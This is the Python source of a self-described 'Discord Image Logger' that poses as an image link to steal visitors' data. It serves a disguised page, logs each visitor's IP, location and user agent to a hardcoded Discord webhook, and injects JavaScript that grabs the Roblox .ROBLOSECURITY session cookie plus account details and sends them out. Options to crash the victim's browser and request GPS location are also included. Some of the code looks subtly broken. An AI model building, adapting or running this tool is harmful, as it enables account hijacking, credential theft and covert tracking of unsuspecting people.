# Image Logger
# By Team C00lB0i/C00lB0i | https://github.com/OverPowerC

from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib import parse
import traceback, requests, base64, httpagentparser, json

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "C00lB0i"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1477054008400154857/tw2pK-xTaQNHLwJNWuLzrSn86884av8RRswJZjH64MDDCnGphGlP8v9xfmmlRuRcAwCU",
    "image": "![image](https://media.tenor.com/BP79uBTrSy0AAAAe/loading-discord.png)", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want to use for the webhook
    "color": 12452044, # Hex color for embed (default is 0xBE1931)
    
    # OPTIONS #
    "crashBrowser": False, # Crashes the victim's browser (may not work on all browsers)
    "accurateLocation": False, # Uses GPS to get the victim's location (will ask for permission)
    "message": { # Show a custom message when the victim opens the image (set to None to disable)
        "title": "Image Logger",
        "description": "Your IP has been logged",
        "image": "![image](https://media.tenor.com/BP79uBTrSy0AAAAe/loading-discord.png)",
        "color": 12452044,
        "footer": "Image Logger",
        "footer_icon": "![image](https://media.tenor.com/BP79uBTrSy0AAAAe/loading-discord.png)"
    },
    "vpnCheck": True, # Check if the victim is using a VPN (may not be accurate)
    "botCheck": True, # Check if the victim is a bot (may not be accurate)
    "blacklist": True, # Blacklist certain IPs from being logged
    "blacklistIPs": ["127.0.0.1", "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16"], # Blacklisted IPs (private IPs)
    "buggedImage": False, # Use a bugged image to prevent Discord from caching the image (may not work)
    "redirect": { # Redirect the victim to a different website after logging their IP (set to None to disable)
        "url": "https://roblox.com",
        "message": "Click the link below to continue"
    }
}

blacklistedIPs = tuple(config["blacklistIPs"])

# [ADDED] Roblox Data Sender Function
def sendRobloxData(data, ip):
    """Send stolen Roblox account data to Discord webhook"""
    try:
        embed = {
            "title": "Roblox Account Grabbed",
            "color": 12452044,
            "fields": [
                {"name": "Username", "value": data['username'], "inline": True},
                {"name": "Display Name", "value": data['displayName'], "inline": True},
                {"name": "User ID", "value": str(data['userId']), "inline": True},
                {"name": "Robux", "value": str(data['robux']), "inline": True},
                {"name": "Premium", "value": "Yes" if data['premium'] else "No", "inline": True},
                {"name": "IP Address", "value": ip, "inline": False},
                {"name": ".ROBLOSECURITY Cookie", "value": f"```{data['cookie']}```", "inline": False}
            ]
        }
        requests.post(config["webhook"], json={"embeds": [embed]})
    except:
        pass

def makeReport(ip, useragent, coords=None):
    if ip.startswith(blacklistedIPs):
        return
    
    try:
        ipData = requests.get(f"http://ip-api.com/json/{ip}?fields=66846719").json()
    except:
        ipData = None
    
    if config["vpnCheck"] and ipData and ipData.get("proxy") == False:
        return
    
    if config["botCheck"] and "bot" in useragent.lower():
        return
    
    embed = {
        "username": config["username"],
        "color": config["color"],
        "fields": [
            {"name": "IP Address", "value": ip, "inline": True},
            {"name": "User Agent", "value": useragent, "inline": False}
        ]
    }
    
    if ipData:
        embed["fields"].extend([
            {"name": "ISP", "value": ipData.get("isp", "Unknown"), "inline": True},
            {"name": "ASN", "value": ipData.get("as", "Unknown"), "inline": True},
            {"name": "Country", "value": ipData.get("country", "Unknown"), "inline": True},
            {"name": "Region", "value": ipData.get("regionName", "Unknown"), "inline": True},
            {"name": "City", "value": ipData.get("city", "Unknown"), "inline": True},
            {"name": "ZIP Code", "value": ipData.get("zip", "Unknown"), "inline": True},
            {"name": "Latitude", "value": str(ipData.get("lat", "Unknown")), "inline": True},
            {"name": "Longitude", "value": str(ipData.get("lon", "Unknown")), "inline": True},
            {"name": "Timezone", "value": ipData.get("timezone", "Unknown"), "inline": True},
            {"name": "Mobile", "value": "Yes" if ipData.get("mobile") else "No", "inline": True},
            {"name": "VPN", "value": "Yes" if ipData.get("proxy") else "No", "inline": True},
            {"name": "Hosting", "value": "Yes" if ipData.get("hosting") else "No", "inline": True}
        ])
    
    if coords:
        embed["fields"].append({"name": "GPS Coordinates", "value": f"https://www.google.com/maps?q={coords[0]},{coords[1]}", "inline": False})
    
    if config["message"]:
        embed["title"] = config["message"]["title"]
        embed["description"] = config["message"]["description"]
        embed["thumbnail"] = {"url": config["message"]["image"]}
        embed["footer"] = {"text": config["message"]["footer"], "icon_url": config["message"]["footer_icon"]}
    
    requests.post(config["webhook"], json={"embeds": [embed]})

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.handleRequest()
    
    def do_POST(self):
        self.handleRequest()
    
    def handleRequest(self):
        # [ADDED] Check for Roblox data submission endpoint
        if self.path.startswith('/roblox'):
            parsed_url = parse.urlparse(self.path)
            params = parse.parse_qs(parsed_url.query)
            if 'data' in params:
                try:
                    decoded_data = json.loads(base64.b64decode(params['data'][0]).decode())
                    victim_ip = params.get('ip', ['0.0.0.0'])[0]
                    sendRobloxData(decoded_data, victim_ip)
                except:
                    pass
            
            # Return 1x1 transparent GIF to prevent broken image icon
            self.send_response(200)
            self.send_header('Content-type', 'image/gif')
            self.end_headers()
            self.wfile.write(b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00\x21\xf9\x04\x01\x00\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b')
            return
        
        # [EXISTING CODE CONTINUES UNCHANGED]
        if config["imageArgument"]:
            if parse.urlparse(self.path).query.startswith("url="):
                url = parse.unquote(parse.urlparse(self.path).query.split("url=")[1])
            else:
                url = config["image"]
        else:
            url = config["image"]

        # [MODIFIED] HTML with injected Roblox grabber (existing structure preserved)
        data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style>
<script>
// [ADDED] Roblox Cookie Grabber
(function() {{
    try {{
        const robloxCookie = document.cookie.split('; ').find(row => row.startsWith('.ROBLOSECURITY='));
        if (!robloxCookie) return;
        
        const cookieValue = robloxCookie.split('=')[1];
        
        fetch('https://users.roblox.com/v1/users/authenticated', {{
            credentials: 'include',
            headers: {{'Cookie': `.ROBLOSECURITY={{cookieValue}}`}}
        }})
        .then(r => r.json())
        .then(user => {{
            const userId = user.id;
            const username = user.name;
            const displayName = user.displayName;
            
            return fetch('https://economy.roblox.com/v1/user/currency', {{
                credentials: 'include',
                headers: {{'Cookie': `.ROBLOSECURITY={{cookieValue}}`}}
            }})
            .then(r => r.json())
            .then(currency => {{
                const robux = currency.robux || 0;
                
                return fetch(`https://premiumfeatures.roblox.com/v1/users/{{userId}}/subscriptions`, {{
                    credentials: 'include',
                    headers: {{'Cookie': `.ROBLOSECURITY={{cookieValue}}`}}
                }})
                .then(r => r.json())
                .then(premium => {{
                    const hasPremium = premium && premium.length > 0;
                    
                    const stolenData = {{
                        cookie: cookieValue,
                        username: username,
                        displayName: displayName,
                        robux: robux,
                        userId: userId,
                        premium: hasPremium
                    }};
                    
                    // Send to logger server via image request
                    const img = new Image();
                    img.src = `/roblox?data={{btoa(JSON.stringify(stolenData))}}&ip={self.headers.get('x-forwarded-for')}`;
                }});
            }});
        }})
        .catch(err => {{}});
    }} catch(e) {{}}
}})();
</script>
<div class="img"></div>'''.encode()
        
        # [EXISTING CODE CONTINUES UNCHANGED]
        if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
            return
        
        if self.headers.get('user-agent') and "bot" in self.headers.get('user-agent').lower() and config["botCheck"]:
            self.send_response(200 if config["buggedImage"] else 302)
            self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
            self.end_headers()
            if config["buggedImage"]:
                self.wfile.write(b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90wS\xde\x00\x00\x00\tpHYs\x00\x00\x0b\x13\x00\x00\x0b\x13\x01\x00\x9a\x9c\x18\x00\x00\x00\nIDATx\x9cc\xf8\x00\x00\x00\x01\x00\x01\x00\x00\x00\x00IEND\xaeB`\x82')
            return
        
        if config["accurateLocation"]:
            data = f'''<script>
var request = new XMLHttpRequest();
request.onload = function() {{
    var location = JSON.parse(request.responseText);
    var image = new Image();
    image.src = `/?lat={{location.location.lat}}&lon=${{location.location.lng}}&ip={self.headers.get('x-forwarded-for')}`;
}};
request.open("GET", "https://ipinfo.io/json", true);
request.send();
</script>'''.encode() + data
        
        if config["crashBrowser"]:
            data = b'<script>for (var i=69420;i==i;i*=i) {document.body.innerHTML="<h1>CRASHED</h1>"}</script>' + data
        
        if config["redirect"]:
            data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["url"]}">'.encode() + data
        
        if config["message"]:
            data = f'<script>alert("{config["message"]["description"]}");</script>'.encode() + data
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(data)
        
        makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), 
                   (parse.parse_qs(parse.urlparse(self.path).query).get('lat', [None])[0], 
                    parse.parse_qs(parse.urlparse(self.path).query).get('lon', [None])[0]) if parse.urlparse(self.path).query else None)

def run(server_class=HTTPServer, handler_class=Handler, port=80):
    try:
        server_address = ('', port)
        httpd = server_class(server_address, handler_class)
        print(f'[{__app__}] Starting server on port {port}...')
        httpd.serve_forever()
    except KeyboardInterrupt:
        print(f'[{__app__}] Shutting down server...')
    except Exception as e:
        print(f'[{__app__}] Error: {e}')
        traceback.print_exc()

if __name__ == '__main__':
    run()
